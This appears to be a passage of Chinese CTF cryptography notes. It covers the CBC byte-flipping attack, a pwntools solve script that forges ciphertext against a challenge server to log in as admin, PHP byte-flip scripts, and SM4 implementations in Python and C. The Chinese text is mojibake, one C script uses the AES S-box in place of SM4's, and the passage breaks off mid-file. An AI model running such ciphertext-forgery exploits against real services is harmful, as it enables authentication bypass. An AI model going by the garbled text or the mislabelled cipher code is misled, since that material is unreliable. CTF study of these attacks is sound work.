^ B1 å‡è®¾ä¿®æ”¹åçš„ä¸Šä¸€ç»„å¯†æ–‡ä¸ºA1&#39;ï¼Œè¦ç¿»è½¬çš„ä¸‹ä¸€ç»„æ˜æ–‡ä¸ºB1&#39;ï¼Œåˆ™æœ‰ï¼šB1&#39; = A1&#39; ^ C1 å¦‚æœèƒ½å¤Ÿä¿®æ”¹Cipher1ï¼Œé‚£ä¹ˆå°±èƒ½å¤Ÿä¿®æ”¹A1çš„å€¼ä¸ºA1&#39;ï¼Œå³A1&#39; = A1 ^ B1 ^ B1&#39;ã€‚ å³ï¼š 12345678B = A ^ CB&#x27; = A&#x27; ^ CA&#x27; = A ^ B ^ B&#x27;A=åŸä¸Šä¸€ç»„å¯†æ–‡Cipher1B=åŸä¸‹ä¸€ç»„æ˜æ–‡Plain2Bâ€˜=è¦ç¿»è½¬çš„ä¸‹ä¸€ç»„æ˜æ–‡Plain2&#x27;A&#x27;=è¦ä¿®æ”¹çš„ä¸Šä¸€ç»„å¯†æ–‡Cipher1&#x27; è¦æ±‚ï¼š1. å¯¹äºA1å®Œå…¨å¯æ§ï¼›2. å·²çŸ¥B1çš„å€¼ã€‚ ç”±äºä¿®æ”¹äº†A1ï¼ŒCipher1åœ¨è¿›è¡ŒBlock Cipher Decryptionçš„æ—¶å€™ä¼šå¾—å‡ºé”™è¯¯çš„ç»“æœï¼Œå†ä¸IVå¼‚æˆ–ä¼šå¯¼è‡´Plain1å‡ºé”™ï¼› å¦‚æœèƒ½å¤Ÿå¾—åˆ°ä¿®æ”¹A1ä¹‹åäº§ç”Ÿçš„é”™è¯¯çš„Plain1çš„å€¼ï¼Œè€Œä¸”IVå¯ä»¥å®Œå…¨æ§åˆ¶çš„è¯ï¼Œé‚£ä¹ˆå°±èƒ½å¤Ÿå†å¥—ç”¨ä¸€æ¬¡å‰é¢çš„æ–¹æ³•ã€‚ å³ï¼š 12345678B = A ^ CB&#x27; = A&#x27; ^ CA&#x27; = A ^ B ^ B&#x27;A=åŸIVå€¼ivB=é”™è¯¯çš„æ˜æ–‡Plain1Bâ€˜=è¦ç¿»è½¬çš„æ˜æ–‡Plain1&#x27;A&#x27;=è¦ä¿®æ”¹çš„IVå€¼iv&#x27; å‚è€ƒï¼šSYPUCTF2020 - Yusaçš„å¯†ç å­¦è¯¾å ‚â€”CBCç¬¬ä¸€è¯¾ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *import binasciiimport timep = remote(&#x27;das.wetolink.com&#x27;,42888) # è¿æ¥p.recvline()p.recvline()p.recvline()p.recvline()p.sendline(&#x27;1&#x27;) # æ³¨å†Œp.recv()p.sendline(&#x27;Admin&#x27;) # ç”¨æˆ·åä¸ºAdminï¼Œæ–¹ä¾¿ä¹‹åä¿®æ”¹data0 = p.recvline().decode()data0 = data0[28:124] # æå–è¿”å›æ•°æ®éƒ¨åˆ†iv0 = data0[:32] #è¿”å›çš„IVcipher00 = data0[32:64] #&#x27;yusayusayusayusa&#x27;çš„åŠ å¯†ç»“æœcipher01 = data0[64:96] #&#x27;Admin&#x27;çš„åŠ å¯†ç»“æœreplacement0 = str(hex(int(cipher00[:2],16)^ord(&#x27;A&#x27;)^ord(&#x27;a&#x27;)))[2:] # è®¡ç®—æ›¿æ¢å¯†æ–‡çš„å€¼payload0 = iv0+replacement0+cipher00[2:]+cipher01 # å‘é€æ›¿æ¢å¯†æ–‡print(&#x27;data0: &#x27;,data0)print(&#x27;payload0: &#x27;,payload0)p.recvline()p.recvline()p.recvline()p.recvline()p.sendline(&#x27;2&#x27;) # ç™»å…¥p.recv()p.sendline(payload0) # å‘é€Payload0data1 = p.recvline()[:64+len(&#x27;Admin&#x27;)*2] # å¾—åˆ°è¿”å›çš„æ•°æ®data1 = data1.decode()plain1 = data1[32:64] # &#x27;yusayusayusayusa&#x27;ç”±äºå¯†æ–‡è¢«æ›¿æ¢ï¼Œè§£å‡ºæ¥çš„æ˜æ–‡æ˜¯é”™è¯¯çš„ï¼Œä¹‹åå¯ä»¥è¿›è¡Œå¼‚æˆ–ä¿®æ”¹print(&#x27;data1: &#x27;,data1)print(&#x27;plain1: &#x27;,plain1)iv1 = str(hex(int(binascii.hexlify(&#x27;yusa&#x27;.encode()).decode()*4,16)^int(plain1,16)^int(iv0,16)))[2:] # è®¡ç®—IVï¼Œç”¨äºä¿®æ”¹é”™è¯¯çš„æ˜æ–‡print(&#x27;iv1: &#x27;,iv1)payload1 = iv1+replacement0+cipher00[2:]+cipher01print(&#x27;payload1: &#x27;,payload1)p.recvline()p.recvline()p.recvline()p.recvline()p.sendline(&#x27;2&#x27;) # ç™»å…¥p.recv()p.sendline(payload1) # å‘é€Payload1p.recvline()p.recvline()print(p.recvline()) # å¾—åˆ°flag CBCå­—èŠ‚ç¿»è½¬ï¼ˆWebï¼‰å‚è€ƒï¼šbugkuctfâ€“login4å­—èŠ‚ç¿»è½¬æ”»å‡» 123456789101112131415161718//åŸå¯†æ–‡ä¿®æ”¹å­—ç¬¦&lt;?php$enc=base64_decode(&quot;bIpgPK29vVQosJ+smzh0pOdq7QrP3H9CN0MBfynL1eKtILs/ayew1snTYbeYSIz8rQctkAUMORS76SWQHXwuKg==&quot;);$enc[13] = chr(ord($enc[13]) ^ ord(&quot;k&quot;) ^ ord (&quot;n&quot;));echo base64_encode($enc);?&gt; //æ–°å¯†æ–‡ï¼Œä¿®æ”¹å¯¹åº”ivå€¼ä¿è¯é¦–å—è§£å¯†æ— é”™&lt;?php$enc=base64_decode(&quot;4quudO++PAeVPQfcFJ0bbm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7fQ==&quot;); $iv=base64_decode(&quot;TrphJjWLH37sj6+EBqh28A==&quot;);$cleartext = &#x27;a:2:&#123;s:8:&quot;userna&#x27;;$newiv = &#x27;&#x27;;for ($i=0;$i&lt;16;$i++)&#123; $newiv=$newiv.chr(ord($iv[$i]) ^ ord($enc[$i]) ^ ord ($cleartext[$i]));&#125;echo base64_encode($newiv);?&gt; Padding Oracle AttackBPæ’ä»¶ï¼šPaddingOracleHunter â€‹ SM4SM4æ˜¯ä¸€ç§åˆ†ç»„å¯†ç ç®—æ³•ï¼Œå…¶åˆ†ç»„é•¿åº¦ä¸º128ä½ï¼ˆå³16å­—èŠ‚ï¼Œ4å­—ï¼‰ï¼Œå¯†é’¥é•¿åº¦ä¹Ÿä¸º128ä½ï¼ˆå³16å­—èŠ‚ï¼Œ4å­—ï¼‰ã€‚å…¶åŠ è§£å¯†è¿‡ç¨‹é‡‡ç”¨äº†32è½®è¿­ä»£æœºåˆ¶ï¼ˆä¸DESã€AESç±»ä¼¼ï¼‰ï¼Œæ¯ä¸€è½®éœ€è¦ä¸€ä¸ªè½®å¯†é’¥ï¼ˆä¸DESã€AESç±»ä¼¼ï¼‰ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485# Pythonclass SM4Cipher: def __init__(self, key: bytes): if not len(key) == 16: raise ValueError(&quot;SM4 key must be length of 16. &quot;) self._key_r = self._generate_key(key) self.block_size = 16 def encrypt(self, plaintext: bytes): return self._do(plaintext, self._key_r) def decrypt(self, ciphertext: bytes): return self._do(ciphertext, self._key_r[::-1]) def _do(self, text: bytes, key_r: list): text_ = [0 for _ in range(4)] # å°† 128bit è½¬åŒ–æˆ 4x32bit for i in range(4): text_[i] = int.from_bytes(text[4 * i:4 * i + 4], &#x27;big&#x27;) for i in range(32): box_in = text_[1] ^ text_[2] ^ text_[3] ^ key_r[i] box_out = self._s_box(box_in) temp = text_[0] ^ box_out ^ self._rot_left(box_out, 2) ^ self._rot_left(box_out, 10) temp = temp ^ self._rot_left(box_out, 18) ^ self._rot_left(box_out, 24) text_ = text_[1:] + [temp] text_ = text_[::-1] # ç»“æœé€†åº # å°† 4x32bit åˆå¹¶æˆ 128bit result = bytearray() for i in range(4): result.extend(text_[i].to_bytes(4, &#x27;big&#x27;)) return bytes(result) def _generate_key(self, key: bytes): &quot;&quot;&quot;å¯†é’¥ç”Ÿæˆ&quot;&quot;&quot; key_r, key_temp = [0 for _ in range(32)], [0 for _ in range(4)] FK = [0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc] CK = [0x00070e15, 0x1c232a31, 0x383f464d, 0x545b6269, 0x70777e85, 0x8c939aa1, 0xa8afb6bd, 0xc4cbd2d9, 0xe0e7eef5, 0xfc030a11, 0x181f262d, 0x343b4249, 0x50575e65, 0x6c737a81, 0x888f969d, 0xa4abb2b9, 0xc0c7ced5, 0xdce3eaf1, 0xf8ff060d, 0x141b2229, 0x30373e45, 0x4c535a61, 0x686f767d, 0x848b9299, 0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209, 0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279] # å°† 128bit æ‹†åˆ†æˆ 4x32bit for i in range(4): temp = int.from_bytes(key[4 * i:4 * i + 4], &#x27;big&#x27;) key_temp[i] = temp ^ FK[i] # å¾ªç¯ç”Ÿæˆè½®å¯†é’¥ for i in range(32): box_in = key_temp[1] ^ key_temp[2] ^ key_temp[3] ^ CK[i] box_out = self._s_box(box_in) key_r[i] = key_temp[0] ^ box_out ^ self._rot_left(box_out, 13) ^ self._rot_left(box_out, 23) key_temp = key_temp[1:] + [key_r[i]] return key_r @staticmethod def _s_box(n: int): BOX = [0xD6, 0x90, 0xE9, 0xFE, 0xCC, 0xE1, 0x3D, 0xB7, 0x16, 0xB6, 0x14, 0xC2, 0x28, 0xFB, 0x2C, 0x05, 0x2B, 0x67, 0x9A, 0x76, 0x2A, 0xBE, 0x04, 0xC3, 0xAA, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99, 0x9C, 0x42, 0x50, 0xF4, 0x91, 0xEF, 0x98, 0x7A, 0x33, 0x54, 0x0B, 0x43, 0xED, 0xCF, 0xAC, 0x62, 0xE4, 0xB3, 0x1C, 0xA9, 0xC9, 0x08, 0xE8, 0x95, 0x80, 0xDF, 0x94, 0xFA, 0x75, 0x8F, 0x3F, 0xA6, 0x47, 0x07, 0xA7, 0xFC, 0xF3, 0x73, 0x17, 0xBA, 0x83, 0x59, 0x3C, 0x19, 0xE6, 0x85, 0x4F, 0xA8, 0x68, 0x6B, 0x81, 0xB2, 0x71, 0x64, 0xDA, 0x8B, 0xF8, 0xEB, 0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35, 0x1E, 0x24, 0x0E, 0x5E, 0x63, 0x58, 0xD1, 0xA2, 0x25, 0x22, 0x7C, 0x3B, 0x01, 0x21, 0x78, 0x87, 0xD4, 0x00, 0x46, 0x57, 0x9F, 0xD3, 0x27, 0x52, 0x4C, 0x36, 0x02, 0xE7, 0xA0, 0xC4, 0xC8, 0x9E, 0xEA, 0xBF, 0x8A, 0xD2, 0x40, 0xC7, 0x38, 0xB5, 0xA3, 0xF7, 0xF2, 0xCE, 0xF9, 0x61, 0x15, 0xA1, 0xE0, 0xAE, 0x5D, 0xA4, 0x9B, 0x34, 0x1A, 0x55, 0xAD, 0x93, 0x32, 0x30, 0xF5, 0x8C, 0xB1, 0xE3, 0x1D, 0xF6, 0xE2, 0x2E, 0x82, 0x66, 0xCA, 0x60, 0xC0, 0x29, 0x23, 0xAB, 0x0D, 0x53, 0x4E, 0x6F, 0xD5, 0xDB, 0x37, 0x45, 0xDE, 0xFD, 0x8E, 0x2F, 0x03, 0xFF, 0x6A, 0x72, 0x6D, 0x6C, 0x5B, 0x51, 0x8D, 0x1B, 0xAF, 0x92, 0xBB, 0xDD, 0xBC, 0x7F, 0x11, 0xD9, 0x5C, 0x41, 0x1F, 0x10, 0x5A, 0xD8, 0x0A, 0xC1, 0x31, 0x88, 0xA5, 0xCD, 0x7B, 0xBD, 0x2D, 0x74, 0xD0, 0x12, 0xB8, 0xE5, 0xB4, 0xB0, 0x89, 0x69, 0x97, 0x4A, 0x0C, 0x96, 0x77, 0x7E, 0x65, 0xB9, 0xF1, 0x09, 0xC5, 0x6E, 0xC6, 0x84, 0x18, 0xF0, 0x7D, 0xEC, 0x3A, 0xDC, 0x4D, 0x20, 0x79, 0xEE, 0x5F, 0x3E, 0xD7, 0xCB, 0x39, 0x48] result = bytearray() # å°† 32bit æ‹†åˆ†æˆ 4x8bitï¼Œä¾æ¬¡è¿›è¡ŒSç›’å˜æ¢ for item in list(n.to_bytes(4, &#x27;big&#x27;)): result.append(BOX[item]) return int.from_bytes(result, &#x27;big&#x27;) @staticmethod def _rot_left(n, m): &quot;&quot;&quot;å¾ªç¯å·¦ç§»&quot;&quot;&quot; return ((n &lt;&lt; m) | (n &gt;&gt; (32 - m))) &amp; 0xFFFFFFFF key = bytes.fromhex(&quot;0123456789ABCDEFFEDCBA9876543210&quot;) # 128bitå¯†é’¥plaintext = bytes.fromhex(&quot;00112233445566778899aabbccddeeff&quot;) # 128bitæ˜æ–‡sm4 = SM4Cipher(key)print(sm4.encrypt(plaintext).hex()) # 09325c4853832dcb9337a5984f671b9a 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164// C è„šæœ¬1#include &lt;stdio.h&gt;#include &lt;iostream&gt;#include&lt;bits/stdc++.h&gt;#include &lt;string.h&gt;/************************************å›ºå®šå‚æ•°****************************************/ //Sç›’const unsigned char Sbox[256] = &#123; 0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76, 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0, 0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15, 0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75, 0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84, 0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf, 0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8, 0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2, 0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73, 0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb, 0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, 0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08, 0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a, 0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, 0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf, 0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16&#125;;//CKä¸ºå›ºå®šå‚æ•°ï¼Œç”¨äºå¯†é’¥æ‰©å±•ç®—æ³• const unsigned int CK[32] = &#123; 0x00070e15, 0x1c232a31, 0x383f464d, 0x545b6269, 0x70777e85, 0x8c939aa1, 0xa8afb6bd, 0xc4cbd2d9, 0xe0e7eef5, 0xfc030a11, 0x181f262d, 0x343b4249, 0x50575e65, 0x6c737a81, 0x888f969d, 0xa4abb2b9, 0xc0c7ced5, 0xdce3eaf1, 0xf8ff060d, 0x141b2229, 0x30373e45, 0x4c535a61, 0x686f767d, 0x848b9299, 0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209, 0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279 &#125;;//ç³»ç»Ÿå‚æ•°FKï¼Œå¯†é’¥æ‰©å±•ç®—æ³•ä¸­ä¼šä½¿ç”¨åˆ° const unsigned int FK[4]=&#123;0xA3B1BAC6, 0x56AA3350, 0x677D9197, 0xB27022DC&#125;; /************************************å…¨å±€å˜é‡****************************************/ unsigned int rk[32];//å­å¯†é’¥ unsigned int X[32];//æ¯ä¸€è½®åŠ å¯†çš„ç»“æœ unsigned int X_0[32];//æ¯ä¸€è½®è§£å¯†çš„ç»“æœ unsigned int y[4];//æš‚æ—¶å­˜æ”¾32è½®åçš„å¯†æ–‡ unsigned int y2[4];//æš‚æ—¶å­˜æ”¾32è½®åçš„æ˜æ–‡ /***********************************æµ‹è¯•ç”¨ä¾‹*****************************************/ unsigned int key[4]=&#123;0x01234567,0x89abcdef,0xfedcba98,0x76543210&#125;;// //unsigned int message[4]=&#123;0x01234567,0x89abcdef,0xfedcba98,0x76543210&#125;;//unsigned int message[16]=&#123;0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01&#125;;/* *åˆ©ç”¨Sç›’éçº¿æ€§ç½®æ¢ *ä¼ è¿›æ¥çš„Aï¼ˆ32ä½ï¼‰å–é«˜ä½çš„8ä½ï¼ˆå¤§ç«¯æœºçœŸå®çš„ä½ä½åœ¨é«˜ä½å‚¨å­˜ï¼‰ä¸0xFFåšä¸è¿ç®—ï¼Œ*ç»è¿‡Sboxç½®æ¢åæ”¾ç½®ä½ä½çš„8ä½ä¸­ï¼Œå†ä¸å…¶ä»–ç½®æ¢å‡ºçš„æ•°åšæˆ–è¿ç®—å¾—åˆ°t *æˆªæ–­ç”¨ &gt;&gt;ï¼ˆä½æ•°ï¼‰ &amp; 0xffï¼Œè€Œæ‹¼æ¥ç”¨ | */ unsigned int T(unsigned int A)&#123; unsigned int t; t = Sbox[(A)&gt;&gt;24&amp;0xFF]&lt;&lt;24|Sbox[(A)&gt;&gt;16&amp;0xFF]&lt;&lt;16|Sbox[(A)&gt;&gt;8&amp;0xFF]&lt;&lt;8|Sbox[(A)&amp;0xFF]; return t;&#125; /**å¾ªç¯å³ç§»*xä¸ºæ•°ï¼Œyä¸ºå³ç§»çš„ä½æ•° */ unsigned int Rotl(unsigned int x, unsigned int y)&#123; unsigned int t = ((x)&gt;&gt;(y)|(x)&lt;&lt;(32-(y))); return t;&#125;/**çº¿æ€§è½¬æ¢L1*åœ¨è½®å‡½æ•°ä¸­ç”¨åˆ° */ unsigned int L1(unsigned int t)&#123; t = (t)^Rotl(t,2)^Rotl(t,10)^Rotl(t,18)^Rotl(t,24); return t;&#125; /**çº¿æ€§è½¬æ¢L2*åœ¨å­å¯†é’¥æ‰©å±•ä¸­ç”¨åˆ° */ unsigned int L2(unsigned int t)&#123; t = (t)^Rotl(t,12)^Rotl(t,22); return t;&#125; /**sms4åŠ å¯†ç®—æ³• */void encrypt(unsigned int x[], unsigned int rk[32], int num)&#123; for(int i=0; i&lt;32; i+=4)&#123; x[0+num] = x[0+num]^L1(T(x[1+num]^x[2+num]^x[3+num]^rk[i+0])); x[1+num] = x[1+num]^L1(T(x[2+num]^x[3+num]^x[0+num]^rk[i+1])); x[2+num] = x[2+num]^L1(T(x[3+num]^x[0+num]^x[1+num]^rk[i+2])); x[3+num] = x[3+num]^L1(T(x[0+num]^x[1+num]^x[2+num]^rk[i+3])); X[i+0] = x[0+num]; X[i+1] = x[1+num]; X[i+2] = x[2+num]; X[i+3] = x[3+num]; &#125; y[0] = X[31]; y[1] = X[30]; y[2] = X[29]; y[3] = X[28];&#125;/**sms4è§£å¯†ç®—æ³• */void decrypt(unsigned int x[], unsigned int rk[32], int num)&#123; for(int i=0; i&lt;32; i+=4)&#123; x[0] = x[0]^L1(T(x[1]^x[2]^x[3]^rk[31-i])); x[1] = x[1]^L1(T(x[2]^x[3]^x[0]^rk[30-i])); x[2] = x[2]^L1(T(x[3]^x[0]^x[1]^rk[29-i])); x[3] = x[3]^L1(T(x[0]^x[1]^x[2]^rk[28-i])); X_0[i+0] = x[0]; X_0[i+1] = x[1]; X_0[i+2] = x[2]; X_0[i+3] = x[3]; &#125; y2[0] = X_0[31]; y2[1] = X_0[30]; y2[2] = X_0[29]; y2[3] = X_0[28];&#125;/**å¯†é’¥æ‰©å±•ç®—æ³•*/ void keyExt(unsigned int key[4])&#123; unsigned int K[4]; K[0] = key[0]^FK[0]; K[1] = key[1]^FK[1]; K[2] = key[2]^FK[2]; K[3] = key[3]^FK[3]; for(int i=0; i&lt;32; i+=4)&#123; K[0] = K[0]^L2(T(K[1]^K[2]^K[3]^CK[i+0])); K[1] = K[1]^L2(T(K[2]^K[3]^K[0]^CK[i+1])); K[2] = K[2]^L2(T(K[3]^K[0]^K[1]^CK[i+2])); K[3] = K[3]^L2(T(K[0]^K[1]^K[2]^CK[i+3])); rk[i+0] = K[0]; rk[i+1] = K[1]; rk[i+2] = K[2]; rk[i+3] = K[3]; &#125;&#125;int main()&#123; unsigned int cipher[4]; unsigned int *message_0; //ç”Ÿæˆå­å¯†é’¥ keyExt(key); //å¼€å§‹è§£å¯† FILE *p = fopen(&quot;./cipher.txt&quot;, &quot;r+&quot;); FILE *p2 = fopen(&quot;./decrypted_message.txt&quot;, &quot;wb&quot;); printf(&quot;\\næ˜æ–‡ä¸ºï¼š\\n&quot;); for(int j=0;j&lt;494868;j+=4)&#123; for(int i=0;i&lt;4;i++) fscanf(p,&quot;%08x&quot;, &amp;cipher[i]); decrypt(cipher,rk,j); message_0 = y2; for(int i=0;i&lt;4;i++)&#123; printf(&quot;%08x &quot;, message_0[i]); fprintf(p2,&quot;%08x &quot;, message_0[i]); &#125; printf(&quot;\\n&quot;); fprintf(p2,&quot;\\n&quot;); &#125; fclose(p); fclose(p2);&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269// C è„šæœ¬2#ifndef _SM4_H_#define _SM4_H_#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#define u8 unsigned char#define u32 unsigned longvoid four_uCh2uLong(u8* in, u32* out); //å››å­—èŠ‚è½¬æ¢æˆu32void uLong2four_uCh(u32 in, u8* out); //u32è½¬æ¢æˆå››å­—èŠ‚unsigned long move(u32 data, int length); //å·¦ç§»ï¼Œä¿ç•™ä¸¢å¼ƒä½æ”¾ç½®å°¾éƒ¨unsigned long func_key(u32 input); //å…ˆä½¿ç”¨Sboxè¿›è¡Œéçº¿æ€§å˜åŒ–ï¼Œå†å°†çº¿æ€§å˜æ¢Lç½®æ¢ä¸ºL&#x27;unsigned long func_data(u32 input); //å…ˆä½¿ç”¨Sboxè¿›è¡Œéçº¿æ€§å˜åŒ–ï¼Œå†è¿›è¡Œçº¿æ€§å˜æ¢Lvoid print_hex(u8* data, int len); //æ— ç¬¦å·å­—ç¬¦æ•°ç»„è½¬16è¿›åˆ¶æ‰“å°void encode_fun(u8 len, u8* key, u8* input, u8* output); //åŠ å¯†å‡½æ•°void decode_fun(u8 len, u8* key, u8* input, u8* output); //è§£å¯†å‡½æ•°/******************************å®šä¹‰ç³»ç»Ÿå‚æ•°FKçš„å–å€¼****************************************/const u32 TBL_SYS_PARAMS[4] = &#123; 0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc&#125;;/******************************å®šä¹‰å›ºå®šå‚æ•°CKçš„å–å€¼****************************************/const u32 TBL_FIX_PARAMS[32] = &#123; 0x00070e15,0x1c232a31,0x383f464d,0x545b6269, 0x70777e85,0x8c939aa1,0xa8afb6bd,0xc4cbd2d9, 0xe0e7eef5,0xfc030a11,0x181f262d,0x343b4249, 0x50575e65,0x6c737a81,0x888f969d,0xa4abb2b9, 0xc0c7ced5,0xdce3eaf1,0xf8ff060d,0x141b2229, 0x30373e45,0x4c535a61,0x686f767d,0x848b9299, 0xa0a7aeb5,0xbcc3cad1,0xd8dfe6ed,0xf4fb0209, 0x10171e25,0x2c333a41,0x484f565d,0x646b7279&#125;;/******************************SBoxå‚æ•°åˆ—è¡¨****************************************/const u8 TBL_SBOX[256] = &#123; 0xd6,0x90,0xe9,0xfe,0xcc,0xe1,0x3d,0xb7,0x16,0xb6,0x14,0xc2,0x28,0xfb,0x2c,0x05, 0x2b,0x67,0x9a,0x76,0x2a,0xbe,0x04,0xc3,0xaa,0x44,0x13,0x26,0x49,0x86,0x06,0x99, 0x9c,0x42,0x50,0xf4,0x91,0xef,0x98,0x7a,0x33,0x54,0x0b,0x43,0xed,0xcf,0xac,0x62, 0xe4,0xb3,0x1c,0xa9,0xc9,0x08,0xe8,0x95,0x80,0xdf,0x94,0xfa,0x75,0x8f,0x3f,0xa6, 0x47,0x07,0xa7,0xfc,0xf3,0x73,0x17,0xba,0x83,0x59,0x3c,0x19,0xe6,0x85,0x4f,0xa8, 0x68,0x6b,0x81,0xb2,0x71,0x64,0xda,0x8b,0xf8,0xeb,0x0f,0x4b,0x70,0x56,0x9d,0x35, 0x1e,0x24,0x0e,0x5e,0x63,0x58,0xd1,0xa2,0x25,0x22,0x7c,0x3b,0x01,0x21,0x78,0x87, 0xd4,0x00,0x46,0x57,0x9f,0xd3,0x27,0x52,0x4c,0x36,0x02,0xe7,0xa0,0xc4,0xc8,0x9e, 0xea,0xbf,0x8a,0xd2,0x40,0xc7,0x38,0xb5,0xa3,0xf7,0xf2,0xce,0xf9,0x61,0x15,0xa1, 0xe0,0xae,0x5d,0xa4,0x9b,0x34,0x1a,0x55,0xad,0x93,0x32,0x30,0xf5,0x8c,0xb1,0xe3, 0x1d,0xf6,0xe2,0x2e,0x82,0x66,0xca,0x60,0xc0,0x29,0x23,0xab,0x0d,0x53,0x4e,0x6f, 0xd5,0xdb,0x37,0x45,0xde,0xfd,0x8e,0x2f,0x03,0xff,0x6a,0x72,0x6d,0x6c,0x5b,0x51, 0x8d,0x1b,0xaf,0x92,0xbb,0xdd,0xbc,0x7f,0x11,0xd9,0x5c,0x41,0x1f,0x10,0x5a,0xd8, 0x0a,0xc1,0x31,0x88,0xa5,0xcd,0x7b,0xbd,0x2d,0x74,0xd0,0x12,0xb8,0xe5,0xb4,0xb0, 0x89,0x69,0x97,0x4a,0x0c,0x96,0x77,0x7e,0x65,0xb9,0xf1,0x09,0xc5,0x6e,0xc6,0x84, 0x18,0xf0,0x7d,0xec,0x3a,0xdc,0x4d,0x20,0x79,0xee,0x5f,0x3e,0xd7,0xcb,0x39,0x48&#125;;#endif//4å­—èŠ‚æ— ç¬¦å·æ•°ç»„è½¬æ— ç¬¦å·longå‹void four_uCh2uLong(u8* in, u32* out)&#123; int i = 0; *out = 0; for (i = 0; i &lt; 4; i++) *out = ((u32)in[i] &lt;&lt; (24 - i * 8)) ^ *out;&#125;//æ— ç¬¦å·longå‹è½¬4å­—èŠ‚æ— ç¬¦å·æ•°ç»„void uLong2four_uCh(u32 in, u8* out)&#123; int i = 0; //ä»32ä½unsigned longçš„é«˜ä½å¼€å§‹å– for (i = 0; i &lt; 4; i++) *(out + i) = (u32)(in &gt;&gt; (24 - i * 8));&#125;//å·¦ç§»ï¼Œä¿ç•™ä¸¢å¼ƒä½æ”¾ç½®å°¾éƒ¨u32 move(u32 data, int length)&#123; u32 result = 0; result = (data &lt;&lt; length) ^ (data &gt;&gt; (32 - length)); return result;&#125;//ç§˜é’¥å¤„ç†å‡½æ•°,å…ˆä½¿ç”¨Sboxè¿›è¡Œéçº¿æ€§å˜åŒ–ï¼Œå†å°†çº¿æ€§å˜æ¢Lç½®æ¢ä¸ºL&#x27;u32 func_key(u32 input)&#123; int i = 0; u32 ulTmp = 0; u8 ucIndexList[4] = &#123; 0 &#125;; u8 ucSboxValueList[4] = &#123; 0 &#125;; uLong2four_uCh(input, ucIndexList); for (i = 0; i &lt; 4; i++) &#123; ucSboxValueList[i] = TBL_SBOX[ucIndexList[i]]; &#125; four_uCh2uLong(ucSboxValueList, &amp;ulTmp); ulTmp = ulTmp ^ move(ulTmp, 13) ^ move(ulTmp, 23); return ulTmp;&#125;//åŠ 